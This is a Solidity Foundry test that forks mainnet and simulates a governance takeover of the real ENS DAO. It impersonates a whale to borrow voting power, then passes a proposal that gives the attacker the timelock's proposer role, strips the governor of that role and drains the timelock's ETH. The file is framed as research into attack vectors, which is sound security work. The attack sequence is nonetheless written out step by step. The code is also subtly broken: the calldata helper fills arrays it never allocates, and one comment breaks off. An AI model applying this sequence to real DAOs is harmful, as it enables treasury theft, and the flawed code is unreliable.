// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { Test } from "forge-std/src/Test.sol";
import { console2 } from "forge-std/src/console2.sol";

import { Users } from "../../contracts/utils/Types.sol";

import { IToken } from "../../dao/ens/interfaces/IToken.sol";
import { IGovernor } from "../../dao/ens/interfaces/IGovernor.sol";
import { ITimelock } from "../../dao/ens/interfaces/ITimelock.sol";

contract Attack_DAO_Test is Test {
     enum ProposalState {
        Pending,
        Active,
        Canceled,
        Defeated,
        Succeeded,
        Queued,
        Expired,
        Executed
    }
    /*//////////////////////////////////////////////////////////////////////////
                                     VARIABLES
    //////////////////////////////////////////////////////////////////////////*/

    bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256("TIMELOCK_ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
    Users internal users;

    /*//////////////////////////////////////////////////////////////////////////
                                   TEST CONTRACTS
    //////////////////////////////////////////////////////////////////////////*/

    IToken public token;
    IGovernor public governor;
    ITimelock public timelock;

    /*//////////////////////////////////////////////////////////////////////////
                                  SET-UP FUNCTION
    //////////////////////////////////////////////////////////////////////////*/

    function setUp() public virtual {
        vm.createSelectFork({ blockNumber: 20_417_177, urlOrAlias: "mainnet" });

        // Create users for testing.
        users = Users({
            deployer: makeAddr("Deployer"),
            alice: makeAddr("Alice"),
            securityCouncilMultisig: address(0x53589828690662ead300299fF70aE11FD1AF9A16),
            attacker: makeAddr("Attacker")
        });

        // Governance contracts ENS
        token = IToken(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
        governor = IGovernor(0x323A76393544d5ecca80cd6ef2A560C6a395b7E3);
        timelock = ITimelock(payable(0xFe89cc7aBB2C4183683ab71653C4cdc9B02D44b7));

        // Label the base test contracts.
        vm.label(address(governor), "governor");
        vm.label(address(timelock), "timelock");
        vm.label(address(token), "token");
    }
    // Executing each step necessary on the proposal lifecycle to understand attack vectors
    function test_Attack_DAO() public {
        // Delegate from top token holder (binance, with 4m $ENS in this case)
        vm.prank(0x5a52E96BAcdaBb82fd05763E25335261B270Efcb);
        token.delegate(users.attacker);

        uint256 votingPower = token.getVotes(users.attacker);
        assertEq(votingPower, 1_546_912_192_000_000_000_000_000);

        // Need to advance 1 block for delegation to be valid on governor
        vm.roll(block.number + 1);

        // Creating a proposal that gives a proposer role to
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _generateCallData();

        string memory description = "";
        bytes32 descriptionHash = keccak256(bytes(description));

        // Governor //
        // Submit malicious proposal
        vm.prank(users.attacker);
        uint256 proposalId = governor.propose(targets, values, calldatas, description);
        assertEq(governor.state(proposalId), 0);

        // Proposal is ready to vote after 2 block because of the revert ERC20Votes: block not yet mined
        vm.roll(block.number + governor.votingDelay() + 1);
        assertEq(governor.state(proposalId), 1);

        // Vote for the proposal
        vm.prank(users.attacker);
        governor.castVote(proposalId, 1);

        // Let the voting end
        vm.roll(block.number + governor.votingPeriod());
        assertEq(governor.state(proposalId), 4);

        // Queue the proposal to be executed
        governor.queue(targets, values, calldatas, descriptionHash);
        assertEq(governor.state(proposalId), 5);

        // Calculate proposalId in timelock
        bytes32 proposalIdInTimelock = timelock.hashOperationBatch(targets, values, calldatas, 0, descriptionHash);
        assertTrue(timelock.isOperationPending(proposalIdInTimelock));

        // Wait the operation in the DAO wallet timelock to be Ready
        vm.warp(block.timestamp + timelock.getMinDelay() + 1);
        assertTrue(timelock.isOperationReady(proposalIdInTimelock));

        // Execute proposal
        governor.execute(targets, values, calldatas, descriptionHash);
        assertTrue(timelock.isOperationDone(proposalIdInTimelock));

        // Check result
        assertTrue(timelock.hasRole(PROPOSER_ROLE, users.attacker));
        assertFalse(timelock.hasRole(PROPOSER_ROLE, address(governor)));
        assertEq(address(timelock).balance, 0);

        console2.log(address(timelock).balance);
    }


    function _generateCallData() internal returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) {
        targets[0] = address(timelock);
        calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), users.attacker));
        values[0] = 0;
        
        targets[1] = address(timelock);
        calldatas[1] = abi.encodeCall(timelock.revokeRole, (timelock.PROPOSER_ROLE(), address(governor)));
        values[1] = 0;
        
        targets[2] = users.attacker;
        calldatas[2] = bytes("");
        values[2] = address(timelock).balance;
        
        return (targets, values, calldatas);
    }
}
